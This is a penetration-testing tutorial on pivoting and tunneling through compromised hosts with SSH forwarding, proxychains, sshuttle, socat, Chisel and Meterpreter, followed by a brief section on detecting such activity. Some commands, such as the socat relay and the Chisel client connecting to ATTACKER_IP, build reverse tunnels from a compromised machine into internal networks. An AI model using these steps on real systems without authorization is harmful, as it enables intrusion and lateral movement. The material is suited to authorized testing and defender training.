# Pivoting and Tunneling

---

## Executive Summary

Pivoting and tunneling allow testers to reach systems that are not directly accessible from the original attack machine. A compromised host can become a bridge into an internal network, allowing traffic to pass through it toward hidden services, isolated subnets, or restricted management interfaces.

These techniques are useful after initial access when internal systems are reachable from the compromised host but not from the tester’s machine.

## Core Concepts

| Concept | Description |
|---|---|
| Pivoting | Using a compromised system to reach another system |
| Tunneling | Encapsulating traffic inside another connection or protocol |
| Port forwarding | Mapping traffic from one port to another host and port |
| SOCKS proxying | Routing many tool connections through a proxy tunnel |
| Routing | Adding paths so traffic can reach internal networks |

## When Pivoting Is Needed

Pivoting is useful when:

- Internal hosts are not exposed to the internet.
- Firewalls block direct access from the attacker machine.
- The compromised host has access to another subnet.
- Internal services only listen on private addresses.
- Administrative ports are restricted to internal systems.
- The target environment uses segmented networks.

## Basic Pivoting Workflow

| Phase | Goal |
|---|---|
| Identify networks | Check interfaces, routes, and reachable subnets |
| Discover internal hosts | Scan carefully from the compromised position |
| Build a tunnel | Use SSH, Meterpreter, Chisel, Socat, or another method |
| Route tools | Send browser, Nmap, Burp, or other traffic through the tunnel |
| Validate access | Confirm that internal services are reachable |
| Limit noise | Avoid unnecessary scanning or unstable tunnels |

## Internal Network Discovery

On Linux:

```bash
ip addr
ip route
hostname -I
```

On Windows:

```cmd
ipconfig /all
route print
arp -a
```

Useful checks:

```bash
ping -c 1 INTERNAL_IP
nc -zv INTERNAL_IP PORT
```

PowerShell alternative:

```powershell
Test-NetConnection INTERNAL_IP -Port PORT
```

## SSH Local Port Forwarding

Local port forwarding exposes an internal service through a local port on the attacker machine.

```bash
ssh -L 8080:INTERNAL_HOST:80 user@PIVOT_HOST
```

Then browse:

```text
http://127.0.0.1:8080
```

Use this when the pivot host can reach the internal service, but the attacker machine cannot.

## SSH Remote Port Forwarding

Remote port forwarding exposes a local attacker service to the remote side.

```bash
ssh -R 9001:127.0.0.1:9001 user@PIVOT_HOST
```

This is useful when the target needs to connect back through an existing SSH session.

## SSH Dynamic Port Forwarding

Dynamic forwarding creates a SOCKS proxy.

```bash
ssh -D 1080 user@PIVOT_HOST
```

Tools and browsers can then route traffic through:

```text
127.0.0.1:1080
```

This is useful for browsing internal web applications or routing multiple tools through one tunnel.

## Proxychains

Proxychains can send tool traffic through a SOCKS proxy.

Example configuration:

```text
socks5 127.0.0.1 1080
```

Example usage:

```bash
proxychains curl http://INTERNAL_HOST
```

```bash
proxychains nmap -sT -Pn INTERNAL_HOST
```

Use TCP connect scans through proxies. Raw packet scans usually do not work reliably through SOCKS proxies.

## Sshuttle

Sshuttle creates a VPN-like tunnel over SSH.

```bash
sshuttle -r user@PIVOT_HOST INTERNAL_SUBNET/CIDR
```

Example:

```bash
sshuttle -r user@10.10.10.5 172.16.1.0/24
```

This is useful when many internal hosts need to be accessed without manually forwarding each port.

## Socat Port Forwarding

Socat can relay traffic between ports and hosts.

Forward local port `8080` to an internal web server:

```bash
socat TCP-LISTEN:8080,fork TCP:INTERNAL_HOST:80
```

Reverse-style relay:

```bash
socat TCP-LISTEN:9001,fork,reuseaddr TCP:ATTACKER_IP:9001
```

Socat is flexible, but it can be noisy and may not exist on the target by default.

## Chisel Tunneling

Chisel is a fast TCP tunneling tool that supports reverse tunnels and SOCKS proxying.

Start the server on the attacker machine:

```bash
chisel server -p 8000 --reverse
```

Run the client from the compromised host:

```bash
chisel client ATTACKER_IP:8000 R:socks
```

This creates a reverse SOCKS proxy that can be used from the attacker machine.

## Meterpreter Routing

Meterpreter can add routes through a compromised host.

Check internal interfaces:

```text
ipconfig
```

Add a route:

```text
run autoroute -s INTERNAL_SUBNET/CIDR
```

View routes:

```text
run autoroute -p
```

Use a SOCKS proxy:

```text
auxiliary/server/socks_proxy
```

Then route tools through Proxychains.

## Port Forwarding with Meterpreter

Forward a remote internal service to a local port:

```text
portfwd add -l 8080 -p 80 -r INTERNAL_HOST
```

Then access:

```text
http://127.0.0.1:8080
```

This is useful for single internal services.

## DNS and Name Resolution

Internal environments often rely on internal DNS names.

Check DNS configuration:

Linux:

```bash
cat /etc/resolv.conf
```

Windows:

```cmd
ipconfig /all
```

When DNS does not resolve through the tunnel, use:

- `/etc/hosts`
- Browser proxy settings
- Proxychains DNS settings
- Direct IP addresses
- Internal DNS server forwarding

## Operational Considerations

Before building a pivot, identify:

- Which subnets the compromised host can reach.
- Which ports are open internally.
- Whether DNS resolution works.
- Whether the tunnel supports the tools you want to use.
- Whether the tunnel is stable enough for scanning.
- Whether traffic will be logged or inspected.
- Whether authentication is required for internal services.

## Common Problems

| Problem | Cause |
|---|---|
| Browser works but tools fail | Tool is not proxy-aware |
| Nmap scan fails | Scan type does not work through SOCKS |
| Internal host cannot be reached | Wrong route, firewall, or subnet |
| DNS names fail | DNS is not routed through the tunnel |
| Tunnel drops often | Unstable shell or network timeout |
| Access works from target but not attacker | Tunnel or forwarding rule is incorrect |

## Defensive Perspective

Pivoting and tunneling may be detected through:

- Internal scanning from unusual hosts.
- Workstations connecting to server-only ports.
- Unexpected SSH connections.
- Long-lived outbound tunnels.
- SOCKS proxy behavior.
- Connections to rare external IPs.
- Abnormal east-west traffic.
- New listening ports on compromised systems.

Defenders should monitor for hosts that suddenly begin behaving like routers, proxies, scanners, or administrative jump boxes.